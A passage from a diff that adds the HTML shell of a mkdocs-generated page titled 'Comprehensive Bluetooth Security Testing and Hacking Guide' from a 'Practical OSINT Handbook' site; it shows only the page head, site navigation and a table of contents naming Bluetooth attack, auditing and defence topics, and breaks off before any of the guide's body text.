@@ -1,0 +1,2615 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Improved, detailed documentation for OSINT operations, tools, and environments.">
+      
+      
+      
+      
+        <link rel="prev" href="../Physical_and_Hardware_Based_Bluetooth_Attacks/">
+      
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>Comprehensive Bluetooth Security Testing and Hacking Guide - Practical OSINT Handbook</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.342714a4.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#table-of-contents" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Practical OSINT Handbook" class="md-header__button md-logo" aria-label="Practical OSINT Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Practical OSINT Handbook
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Comprehensive Bluetooth Security Testing and Hacking Guide
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Practical OSINT Handbook" class="md-nav__button md-logo" aria-label="Practical OSINT Handbook" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Practical OSINT Handbook
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    1. Environment Setup
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            1. Environment Setup
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kali-osint-virtualbox-setup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kali VirtualBox Setup
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../resize-kali-vm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Resize Your VM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OSINT_Environment_Kali_vs_Tails/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tails vs. Kali
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    2. Core Tools & Techniques
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            2. Core Tools & Techniques
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../google_dork_osint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Google Dorking for OSINT
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../theHarvester_OSINT_Guide/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    theHarvester OSINT Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Free_OSINT_Tools_List/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Free OSINT Tools List
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Unique_SOperators_Bing_Yandex/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Unique Search Operators in Bing & Yandex
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    3. Real-World OSINT Use Cases
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            3. Real-World OSINT Use Cases
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../website_monitoring/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OSINT Website Monitoring & Security Checks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Email_Forensic_Investigation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OSINT Email Forensics & Spoofing Analysis
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../advanced_wireless_osint/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Advanced Wireless OSINT
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Burner_Accounts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Burner Accounts
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../white_hack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Finding Leaked Databases, Emails, and Passwords
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    4. Specialized Hacking and Auditing
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            4. Specialized Hacking and Auditing
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bluetooth_Security_Protocols/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bluetooth Security Protocols
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Physical_and_Hardware_Based_Bluetooth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Physical and Hardware-Based Bluetooth Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Comprehensive Bluetooth Security Testing and Hacking Guide
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Comprehensive Bluetooth Security Testing and Hacking Guide
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#table-of-contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      Table of Contents
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduction-to-bluetooth-architecture" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction to Bluetooth Architecture
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Introduction to Bluetooth Architecture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bluetooth-protocol-stack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluetooth Protocol Stack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bluetooth-versions-and-security-evolution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluetooth Versions and Security Evolution
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#linux-bluetooth-commands-and-their-purpose" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux Bluetooth Commands and Their Purpose
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Linux Bluetooth Commands and Their Purpose">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-bluetooth-management-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      Basic Bluetooth Management Commands
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#device-discovery-and-information-gathering" class="md-nav__link">
+    <span class="md-ellipsis">
+      Device Discovery and Information Gathering
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bluetooth-reconnaissance-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluetooth Reconnaissance Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Bluetooth Reconnaissance Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#passive-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Passive Reconnaissance
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#active-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Active Reconnaissance
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#advanced-bluetooth-attack-vectors" class="md-nav__link">
+    <span class="md-ellipsis">
+      Advanced Bluetooth Attack Vectors
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Advanced Bluetooth Attack Vectors">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-bluejacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Bluejacking
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-bluesnarfing" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Bluesnarfing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-bluedebugging" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Bluedebugging
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-bluesmacking-bluetooth-dos" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. BlueSmacking (Bluetooth DoS)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bluetooth-hacking-tools-and-frameworks" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluetooth Hacking Tools and Frameworks
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Bluetooth Hacking Tools and Frameworks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#essential-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Essential Tools
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Essential Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-bluez-suite-built-in-linux-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. BlueZ Suite (Built-in Linux tools)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-specialized-bluetooth-hacking-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Specialized Bluetooth Hacking Tools
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-advanced-frameworks" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Advanced Frameworks
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#practical-attack-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Practical Attack Methods
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Practical Attack Methods">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#method-1-information-gathering-pipeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 1: Information Gathering Pipeline
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-2-service-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 2: Service Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-3-ble-attack-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 3: BLE Attack Methods
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#security-auditing-with-bluetooth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Security Auditing with Bluetooth
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Security Auditing with Bluetooth">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#professional-auditing-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Professional Auditing Tools
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Professional Auditing Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#bluelog-advanced-usage" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluelog - Advanced Usage
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#custom-auditing-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Custom Auditing Scripts
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bluetooth-vulnerabilities-and-security-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bluetooth Vulnerabilities and Security Practices
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Bluetooth Vulnerabilities and Security Practices">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#historical-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      Historical Vulnerabilities
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Historical Vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#classic-attacks-explained" class="md-nav__link">
+    <span class="md-ellipsis">
+      Classic Attacks Explained
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#modern-bluetooth-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      Modern Bluetooth Vulnerabilities
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Modern Bluetooth Vulnerabilities">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#blueborne-cve-2017-0781-cve-2017-0782" class="md-nav__link">
+    <span class="md-ellipsis">
+      BlueBorne (CVE-2017-0781, CVE-2017-0782)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bias-attack-bluetooth-impersonation-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      BIAS Attack (Bluetooth Impersonation AttackS)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ble-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      BLE Vulnerabilities
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defense-and-mitigation-strategies" class="md-nav__link">
+    <span class="md-ellipsis">
+      Defense and Mitigation Strategies
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Defense and Mitigation Strategies">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#device-hardening" class="md-nav__link">
+    <span class="md-ellipsis">
+      Device Hardening
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-level-protection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Network-Level Protection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#security-best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      Security Best Practices
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#monitoring-and-detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Monitoring and Detection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario-based-walkthroughs" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario-Based Walkthroughs
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scenario-Based Walkthroughs">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scenario-1-penetration-testing-a-smart-speaker-amazon-echogoogle-home" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 1: Penetration Testing a Smart Speaker (Amazon Echo/Google Home)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scenario 1: Penetration Testing a Smart Speaker (Amazon Echo/Google Home)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-initial-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 1: Initial Reconnaissance
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-target-identification-and-service-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 2: Target Identification and Service Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-vulnerability-assessment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 3: Vulnerability Assessment
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-4-exploitation-attempts" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 4: Exploitation Attempts
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-2-fitness-tracker-security-assessment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 2: Fitness Tracker Security Assessment
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scenario 2: Fitness Tracker Security Assessment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-ble-device-discovery-and-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 1: BLE Device Discovery and Analysis
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-ble-service-and-characteristic-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 2: BLE Service and Characteristic Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-3-data-extraction-and-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 3: Data Extraction and Analysis
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scenario-3-corporate-bluetooth-infrastructure-assessment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scenario 3: Corporate Bluetooth Infrastructure Assessment
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Scenario 3: Corporate Bluetooth Infrastructure Assessment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#phase-1-environment-mapping" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 1: Environment Mapping
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#phase-2-risk-classification" class="md-nav__link">
+    <span class="md-ellipsis">
+      Phase 2: Risk Classification
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation Techniques
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Post-Exploitation Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#data-exfiltration-via-bluetooth" class="md-nav__link">
+    <span class="md-ellipsis">
+      Data Exfiltration via Bluetooth
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Data Exfiltration via Bluetooth">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#method-1-covert-data-channel-establishment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 1: Covert Data Channel Establishment
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#method-2-bluetooth-file-transfer-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
